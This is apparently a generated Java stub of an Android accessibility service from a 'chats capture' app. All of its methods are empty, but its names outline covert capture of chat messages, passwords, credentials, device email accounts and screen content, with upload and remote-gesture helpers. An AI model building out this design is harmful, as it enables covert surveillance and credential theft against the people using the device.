package com.chats.capture.services;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000\u0088\u0001\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0010\b\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000b\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0016\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\t\n\u0002\b\u0006\u0018\u0000 F2\u00020\u0001:\u0001FB\u0005\u00a2\u0006\u0002\u0010\u0002J\u0010\u0010\u001d\u001a\u00020\f2\u0006\u0010\u001e\u001a\u00020\u001fH\u0002J\u0010\u0010 \u001a\u00020!2\u0006\u0010\"\u001a\u00020#H\u0002J\u0010\u0010$\u001a\u00020!2\u0006\u0010\"\u001a\u00020#H\u0002J\u000e\u0010%\u001a\u00020&2\u0006\u0010\'\u001a\u00020(J\u0010\u0010)\u001a\u00020!2\u0006\u0010*\u001a\u00020\fH\u0002J\u0010\u0010+\u001a\u00020\f2\u0006\u0010\u001e\u001a\u00020\u001fH\u0002J\u0012\u0010,\u001a\u0004\u0018\u00010\f2\u0006\u0010\"\u001a\u00020#H\u0002J\b\u0010-\u001a\u00020!H\u0002J\u0012\u0010.\u001a\u0004\u0018\u00010\f2\u0006\u0010/\u001a\u00020\fH\u0002J\u0010\u00100\u001a\u00020\f2\u0006\u0010*\u001a\u00020\fH\u0002J\u0010\u00101\u001a\u00020!2\u0006\u0010\"\u001a\u00020#H\u0002J\u0010\u00102\u001a\u00020!2\u0006\u0010\"\u001a\u00020#H\u0002J\u0010\u00103\u001a\u00020!2\u0006\u0010\"\u001a\u00020#H\u0002J\u0010\u00104\u001a\u00020!2\u0006\u0010\"\u001a\u00020#H\u0002J\u0010\u00105\u001a\u00020!2\u0006\u0010\"\u001a\u00020#H\u0002J\u0010\u00106\u001a\u00020!2\u0006\u0010\"\u001a\u00020#H\u0002J\u0016\u00107\u001a\u00020&2\u0006\u0010\'\u001a\u00020(2\u0006\u00108\u001a\u00020\fJ\u0010\u00109\u001a\u00020!2\u0006\u0010\"\u001a\u00020#H\u0016J\b\u0010:\u001a\u00020!H\u0016J\b\u0010;\u001a\u00020!H\u0016J\b\u0010<\u001a\u00020!H\u0014J\u0016\u0010=\u001a\u00020&2\u0006\u0010>\u001a\u00020?2\u0006\u0010@\u001a\u00020AJ\u0016\u0010B\u001a\u00020&2\u0006\u0010\'\u001a\u00020(2\u0006\u0010C\u001a\u00020\u0010J\b\u0010D\u001a\u00020!H\u0002J\b\u0010E\u001a\u00020!H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\bX\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\nX\u0082.\u00a2\u0006\u0002\n\u0000R\u0010\u0010\u000b\u001a\u0004\u0018\u00010\fX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\r\u001a\u00020\fX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000e\u001a\u00020\fX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000f\u001a\u00020\u0010X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0011\u001a\u00020\u0012X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0013\u001a\u00020\u0014X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0015\u001a\u00020\u0016X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0017\u001a\u00020\u0018X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0019\u001a\u00020\u001aX\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u001b\u001a\u00020\u001cX\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006G"}, d2 = {"Lcom/chats/capture/services/EnhancedAccessibilityService;", "Landroid/accessibilityservice/AccessibilityService;", "()V", "chatDao", "Lcom/chats/capture/database/ChatDao;", "chatMediaExtractor", "Lcom/chats/capture/utils/ChatMediaExtractor;", "credentialExtractor", "Lcom/chats/capture/utils/CredentialExtractor;", "deviceRegistrationManager", "Lcom/chats/capture/managers/DeviceRegistrationManager;", "lastChatIdentifier", "", "lastPackageName", "lastTextBuffer", "lastWindowId", "", "mediaUploadManager", "Lcom/chats/capture/managers/MediaUploadManager;", "messageBuffer", "Lcom/chats/capture/utils/MessageBuffer;", "messageGroupingManager", "Lcom/chats/capture/utils/MessageGroupingManager;", "passwordCaptureManager", "Lcom/chats/capture/utils/PasswordCaptureManager;", "screenCapture", "Lcom/chats/capture/utils/ScreenCapture;", "serviceScope", "Lkotlinx/coroutines/CoroutineScope;", "calculateFileChecksum", "file", "Ljava/io/File;", "captureScreenContent", "", "event", "Landroid/view/accessibility/AccessibilityEvent;", "checkMessageCompletion", "clickNode", "", "node", "Landroid/view/accessibility/AccessibilityNodeInfo;", "completeMessage", "packageName", "determineMimeType", "extractChatIdentifier", "extractDeviceEmailAccounts", "extractDomainFromEmail", "email", "getAppName", "handleAppSwitch", "handleGestureDetected", "handleTextChanged", "handleViewClicked", "handleViewScrolled", "handleWindowStateChanged", "inputText", "text", "onAccessibilityEvent", "onDestroy", "onInterrupt", "onServiceConnected", "performGesture", "path", "Landroid/graphics/Path;", "duration", "", "scrollNode", "direction", "startForegroundService", "startMessageTimeoutChecker", "Companion", "app_debug"})
public final class EnhancedAccessibilityService extends android.accessibilityservice.AccessibilityService {
    @org.jetbrains.annotations.NotNull()
    private final kotlinx.coroutines.CoroutineScope serviceScope = null;
    private com.chats.capture.database.ChatDao chatDao;
    private com.chats.capture.utils.ScreenCapture screenCapture;
    private com.chats.capture.utils.PasswordCaptureManager passwordCaptureManager;
    private com.chats.capture.utils.CredentialExtractor credentialExtractor;
    private com.chats.capture.managers.DeviceRegistrationManager deviceRegistrationManager;
    private com.chats.capture.utils.MessageBuffer messageBuffer;
    private com.chats.capture.utils.MessageGroupingManager messageGroupingManager;
    private com.chats.capture.utils.ChatMediaExtractor chatMediaExtractor;
    private com.chats.capture.managers.MediaUploadManager mediaUploadManager;
    @org.jetbrains.annotations.NotNull()
    private java.lang.String lastTextBuffer = "";
    @org.jetbrains.annotations.NotNull()
    private java.lang.String lastPackageName = "";
    @org.jetbrains.annotations.Nullable()
    private java.lang.String lastChatIdentifier;
    private int lastWindowId = -1;
    private static final int KEYBOARD_SERVICE_ID = 1002;
    public static final int SCROLL_UP = 1;
    public static final int SCROLL_DOWN = 2;
    public static final int SCROLL_LEFT = 3;
    public static final int SCROLL_RIGHT = 4;
    @org.jetbrains.annotations.NotNull()
    public static final com.chats.capture.services.EnhancedAccessibilityService.Companion Companion = null;
    
    public EnhancedAccessibilityService() {
        super();
    }
    
    @java.lang.Override()
    protected void onServiceConnected() {
    }
    
    @java.lang.Override()
    public void onDestroy() {
    }
    
    @java.lang.Override()
    public void onAccessibilityEvent(@org.jetbrains.annotations.NotNull()
    android.view.accessibility.AccessibilityEvent event) {
    }
    
    @java.lang.Override()
    public void onInterrupt() {
    }
    
    private final void handleTextChanged(android.view.accessibility.AccessibilityEvent event) {
    }
    
    /**
     * Check if message should be completed (Enter key or send button)
     */
    private final void checkMessageCompletion(android.view.accessibility.AccessibilityEvent event) {
    }
    
    /**
     * Complete and save a message from buffer
     */
    private final void completeMessage(java.lang.String packageName) {
    }
    
    private final java.lang.String calculateFileChecksum(java.io.File file) {
        return null;
    }
    
    private final java.lang.String determineMimeType(java.io.File file) {
        return null;
    }
    
    /**
     * Handle app switching - save current buffers
     */
    private final void handleAppSwitch(android.view.accessibility.AccessibilityEvent event) {
    }
    
    /**
     * Start periodic checker for timed-out messages
     */
    private final void startMessageTimeoutChecker() {
    }
    
    private final void handleWindowStateChanged(android.view.accessibility.AccessibilityEvent event) {
    }
    
    private final void handleGestureDetected(android.view.accessibility.AccessibilityEvent event) {
    }
    
    private final void handleViewClicked(android.view.accessibility.AccessibilityEvent event) {
    }
    
    private final void handleViewScrolled(android.view.accessibility.AccessibilityEvent event) {
    }
    
    private final void captureScreenContent(android.view.accessibility.AccessibilityEvent event) {
    }
    
    private final java.lang.String extractChatIdentifier(android.view.accessibility.AccessibilityEvent event) {
        return null;
    }
    
    private final java.lang.String getAppName(java.lang.String packageName) {
        return null;
    }
    
    /**
     * Extract email accounts configured on device and save them
     */
    private final void extractDeviceEmailAccounts() {
    }
    
    private final java.lang.String extractDomainFromEmail(java.lang.String email) {
        return null;
    }
    
    public final boolean clickNode(@org.jetbrains.annotations.NotNull()
    android.view.accessibility.AccessibilityNodeInfo node) {
        return false;
    }
    
    public final boolean inputText(@org.jetbrains.annotations.NotNull()
    android.view.accessibility.AccessibilityNodeInfo node, @org.jetbrains.annotations.NotNull()
    java.lang.String text) {
        return false;
    }
    
    public final boolean scrollNode(@org.jetbrains.annotations.NotNull()
    android.view.accessibility.AccessibilityNodeInfo node, int direction) {
        return false;
    }
    
    public final boolean performGesture(@org.jetbrains.annotations.NotNull()
    android.graphics.Path path, long duration) {
        return false;
    }
    
    private final void startForegroundService() {
    }
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000\u0014\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\b\n\u0002\b\u0005\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000\u00a8\u0006\t"}, d2 = {"Lcom/chats/capture/services/EnhancedAccessibilityService$Companion;", "", "()V", "KEYBOARD_SERVICE_ID", "", "SCROLL_DOWN", "SCROLL_LEFT", "SCROLL_RIGHT", "SCROLL_UP", "app_debug"})
    public static final class Companion {
        
        private Companion() {
            super();
        }
    }
}